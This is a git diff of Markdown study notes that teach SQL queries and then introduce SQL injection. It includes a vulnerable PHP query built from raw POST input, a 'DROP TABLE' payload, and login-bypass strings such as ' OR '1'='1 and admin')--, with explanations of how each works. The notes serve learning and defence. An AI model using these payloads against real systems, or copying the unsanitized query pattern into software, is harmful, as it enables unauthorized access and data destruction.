@@ -3,7 +3,7 @@
 SQL Injection happens when a hacker sends input that changes a database query. 
 Instead of just treating the input as normal text, the app runs it as part of the SQL command. This lets the attacker access, change, or delete data.
 
-# Some MySQL Commands:
+# Some Basic Commands:
 
 **Login:**
 
@@ -88,7 +88,9 @@ This makes sure:
 **INSERT – Add New Data:**
 
 `INSERT INTO logins VALUES (1, 'admin', 'p@ssw0rd', '2020-07-02');`
+
 `INSERT INTO logins(username, password) VALUES ('administrator', 'adm1n_p@ss');`
+
 <pre>INSERT INTO logins(username, password)
 VALUES ('john', 'john123!'), ('tom', 'tom123!');</pre>
 
@@ -138,3 +140,339 @@ WHERE condition;</pre>
 `UPDATE logins SET password = 'change_password' WHERE id > 1;`
 
 This changes the password for all users with an ID greater than 1.
+
+
+# Controlling Query Results
+
+**Sorting Results:**
+
+Use `ORDER BY` to sort rows by a specific column.
+
+Example – Sort by password (A-Z):
+
+`SELECT * FROM logins ORDER BY password;`
+
+Descending order (Z-A):
+
+`SELECT * FROM logins ORDER BY password DESC;`
+
+Sort by multiple columns:
+
+`SELECT * FROM logins ORDER BY password DESC, id ASC;`
+
+**LIMIT – Show Fewer Rows:**
+
+Use `LIMIT` to show only a specific number of rows.
+
+Example – Show first 2 rows:
+
+`SELECT * FROM logins LIMIT 2;`
+
+With offset – Skip the first row, show next 2:
+
+`SELECT * FROM logins LIMIT 1, 2;`
+
+Offset starts at 0 (so LIMIT 1, 2 means "start at second row, show 2 rows").
+
+**WHERE – Filter Results:**
+
+Use `WHERE` to show only rows that meet a condition.
+
+Example – Show users with id > 1:
+
+`SELECT * FROM logins WHERE id > 1;`
+
+Show user where username is 'admin':
+
+`SELECT * FROM logins WHERE username = 'admin';`
+
+
+
+**LIKE – Pattern Matching**
+
+Use `LIKE` to find values based on patterns.
+
+Example – Find usernames that start with 'admin':
+
+`SELECT * FROM logins WHERE username LIKE 'admin%';`
+
+`%` matches any number of characters
+`_` matches exactly one character
+
+Example – Find usernames with exactly 3 letters:
+
+`SELECT * FROM logins WHERE username LIKE '___';`
+
+This would match "tom", but not "john" or "admin".
+
+
+# 🔹 SQL Operators – Combining Conditions
+
+**✅ AND Operator:**
+
+Returns TRUE only if both conditions are true.
+
+`SELECT 1 = 1 AND 'test' = 'test';  -- Returns 1 (true)`
+
+`SELECT 1 = 1 AND 'test' = 'abc';   -- Returns 0 (false)`
+
+
+**✅ OR Operator:**
+
+Returns TRUE if at least one condition is true.
+
+`SELECT 1 = 1 OR 'test' = 'abc';    -- Returns 1 (true)`
+
+`SELECT 1 = 2 OR 'test' = 'abc';    -- Returns 0 (false)`
+
+**✅ NOT Operator:**
+
+Flips TRUE to FALSE and vice versa.
+
+`SELECT NOT 1 = 1;  -- Returns 0 (false)`
+
+`SELECT NOT 1 = 2;  -- Returns 1 (true)`
+
+**🔣 Symbol Versions:**
+
+You can also use:
+
+- `&&` for `AND`
+- `||` for `OR`
+- `!` for `NOT`
+
+<pre>SELECT 1 = 1 && 'test' = 'abc';    -- Returns 0
+SELECT 1 = 1 || 'test' = 'abc';    -- Returns 1
+SELECT 1 != 1;                     -- Returns 0</pre>
+
+**🧪 Operators in Queries**
+
+Example – Get all users except 'john':
+
+`SELECT * FROM logins WHERE username != 'john';`
+
+Example – Get users with id > 1 and not 'john':
+
+`SELECT * FROM logins WHERE username != 'john' AND id > 1;`
+
+**⚙️ Operator Precedence (Order of Execution)**
+
+SQL follows a priority order when multiple operators are used. Higher ones are done first:
+
+- *, /, %
+- +, -
+- Comparisons (=, >, <, !=, LIKE)
+- NOT
+- AND
+- OR
+
+🔍 Example with Precedence:
+
+SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
+
+This is evaluated like:
+
+SELECT * FROM logins WHERE username != 'tom' AND id > 1;
+
+It first calculates 3 - 2, then checks the conditions, and finally applies AND.
+
+# Intro to SQL Injection
+
+**Using User Input in Queries**
+
+Apps often include user input in SQL queries, like this search feature:
+
+<pre>$searchInput = $_POST['findUser'];
+$query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";</pre>
+
+Problem: If this input isn't sanitized (cleaned), it can lead to SQL injection.
+
+**Example Injection:**
+
+If the user inputs:
+
+`1'; DROP TABLE users; --`
+
+The full query becomes:
+
+`SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;--'`
+
+This could delete the entire users table!
+
+**❌ Syntax Errors from Bad Input**
+
+The example above causes an error:
+
+Error: `syntax error near "'"`
+
+This happens when the injected SQL breaks the query format — e.g., unmatched quotes.
+
+To avoid errors and make injections work, attackers often:
+
+Use comments (--) to cut off the rest of the query
+
+Or balance the quotes properly
+
+**📚 Types of SQL Injections**
+
+There are three main types of SQL injection attacks:
+
+1. 🧪 In-Band Injection
+
+Output is directly visible on the page.
+
+Union-based: Adds results to the current output using UNION SELECT.
+
+Error-based: Triggers SQL errors that leak information.
+
+2. 🕵️ Blind Injection
+
+No output is shown — attackers guess the result based on page behavior.
+
+Boolean-based: True/False conditions control page content.
+
+Time-based: Uses SLEEP() to delay response if a condition is true.
+
+3. 📤 Out-of-Band Injection
+
+Sends data to an external location (e.g., via DNS requests) if direct access isn’t possible.
+
+
+# Subverting Query Logic
+
+**🔐 Authentication Bypass**
+
+Imagine a login page with this SQL query:
+
+`SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';`
+
+If both the username and password match, the login is successful. If either is wrong, it fails.
+
+**🧪 Discovering SQL Injection**
+
+To test if the login form is vulnerable, we try injecting characters like ', ", or # in the input fields.
+
+Example:
+
+Entering `'` as the username might cause this query:
+
+`SELECT * FROM logins WHERE username=''' AND password='something';`
+
+This throws a syntax error, revealing that the input is directly included in the SQL statement. That means it's vulnerable.
+
+**✅ Bypassing with OR Injection**
+
+We want the query to return true no matter what we enter. The trick is to inject something like:
+
+`admin' OR '1'='1`
+
+This changes the SQL query to:
+
+`SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';`
+
+Since '1'='1' is always true, the query will succeed even with the wrong password.
+
+**🧠 Note: SQL evaluates AND before OR, but '1'='1' still causes the overall query to return true.**
+
+
+
+**❓ What if the Username is Unknown?**
+
+If you enter a fake username like notAdmin, it fails:
+
+`SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something';`
+
+Why? Because `username='notAdmin'` is false, and `'1'='1' AND password='something'` is also false (because the password doesn’t match any real user).
+
+**✅ Bypassing from the Password Field**
+
+You can bypass it even if the username is invalid by injecting in the password field:
+
+Input:
+
+- Username: `anything`
+- Password: `something' OR '1'='1`
+
+Query becomes:
+
+`SELECT * FROM logins WHERE username='anything' AND password='something' OR '1'='1';`
+
+Now `'1'='1'` makes the query return true, and you get logged in—usually as the first user in the database (often admin).
+
+**🧪 Final Working Payload**
+
+You can simply enter:
+
+Username: `' OR '1'='1`
+Password: `' OR '1'='1`
+
+Which results in:
+
+`SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';`
+
+✅ This always returns true → Login bypassed.
+
+# 🗨️ Using Comments in SQL Injection
+
+
+| Type         | Example                    | Notes                                       |
+| ------------ | -------------------------- | ------------------------------------------- |
+| `-- ` (dash) | `-- this is a comment`     | Must be followed by a **space**             |
+| `#` (hash)   | `# this is also a comment` | May need to be URL-encoded as `%23` in URLs |
+| `/* */`      | `/* this is a comment */`  | Not usually used in basic SQL injection     |
+
+
+**✨ Example: Using -- to Bypass Login**
+
+Let's say the website uses this SQL query for login:
+
+`SELECT * FROM logins WHERE username='admin' AND password='something';`
+
+If we inject admin'-- as the username, it becomes:
+
+`SELECT * FROM logins WHERE username='admin'-- ' AND password='something';`
+
+🔍 The part after -- is ignored. So the query is now just:
+
+`SELECT * FROM logins WHERE username='admin';`
+
+✅ The password check is bypassed → Login successful.
+
+**⚠️ Note About URLs**
+
+- `--` becomes `--+` in URLs (the space is encoded as +)
+- `#` becomes `%23` in URLs
+
+**🧪 Real Case: Parentheses & Hashed Passwords**
+
+Let’s look at a more complex query:
+
+`SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hashed_pw';`
+
+Even if the password is correct, the query will fail for admin if their id is 1.
+
+💡 You can't inject in the password field here because it gets hashed. But you can still bypass with a clever username.
+
+**❌ Failing Example**
+
+Username: `admin'--`
+
+Query becomes:
+
+`SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password='hash';`
+
+⛔ Syntax error: unmatched parenthesis.
+
+**✅ Fixing with Parenthesis**
+
+Username: `admin')--`
+
+Final query:
+
+`SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password='hash';`
+
+🟢 The rest of the condition is ignored, and only the username check is run.
+
+✅ Login successful as admin.
+
+
